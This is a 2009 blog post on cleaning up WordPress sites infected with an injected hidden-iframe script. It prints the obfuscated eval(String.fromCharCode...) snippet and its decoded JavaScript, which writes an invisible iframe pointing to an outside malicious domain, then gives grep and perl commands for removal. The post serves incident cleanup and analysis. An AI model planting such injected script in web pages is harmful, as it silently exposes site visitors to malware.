---
published: true
author: gerold-mercadero
date: '2009-03-22 12:25:15'
layout: post
slug: heurtrojanscriptiframe
status: publish
title: HEUR:Trojan.Script.Iframe
wordpress_id: '432'
categories:
- News
- Security
tags:
- virus
---

One of my friend asked for help about virus appearing on his sites (mostly WordPress sites).  I checked it out and my Kaspersky Internet Security blocked the pages from loading, so i downloaded the files manually and scanned html with Kaspersky to determine affected files.


![virus2](http://linuxsysadminblog.com/images/2009/03/virus2-220x300.gif)



I noticed that the affected files were PHP and HTML only and if you compare the code of the original WordPress files with the infected one you will see the difference.  Below are sample added codes/virus:



HTML files: `<script type="text/javascript">eval(String.fromCharCode(118,97...50,55))</script>`
PHP files:  `<?php echo '<script type="text/javascript">eval(String.fromCharCode(118,97...50,55))</script>'; ?>`

**What it does**
I'm not a virus expert and I'm curios on what this portion of code does so i looked at it.  In our case the resulting text add this portion of code to the html or php files:

`var fggge3="si";
var w345="pl";
var re6="ank.";
var rr="com";
var a="if";
var s="tt";
document.write('<'+a+'rame src="h'+s+'p://'+fggge3+''+w345+''+re6+''+rr+'/'+'qqp/'+''+''+'" style="d'+'isplay:n'+'one">');
var t=00001217
`

and you can see it tries to load an iframe:

`<iframe src=http://siplank.com/qqp/ style=display:none>`

**Virus Removal**
You can remove the virus by just deleting the code (sample above) on the affected files.  If you need to cleanup hundred of infected files (in our case more than 800) you can do the following:

- Get the list of infected files.  You can use grep to search for them
`grep -Z -R "eval(String.fromCharCode(118,97,114" /path/to/site/* >> affected_file_list.txt`
- Delete the codes by using perl/sed commands.  Repeat the commands for every files.
`perl -pi -e 's/\<script type="text\/javascript"\>eval\(String.fromCharCode\(118,97,114...51,51\)\)\<\/script\>//'  /path/to/affected/file.htm
perl -pi -e "s/\<\?php echo ''; \?\>\<\?php echo ''; \?\>//"  /path/to/affected/file.php`

Or create a bash/shell script to do the cleanup at once:
`
while read line
do
perl -pi -e 's/\<script type="text\/javascript"\>eval\(String.fromCharCode\(118,97,114...51,51\)\)\<\/script\>//'  $line
perl -pi -e "s/\<\?php echo ''; \?\>\<\?php echo ''; \?\>//"   $line
done < affected_file_list.txt
`

That's all.

I don't know how the attacker gained access to the files and inserted the codes because the file permissions are ok - maybe they gain ftp access.
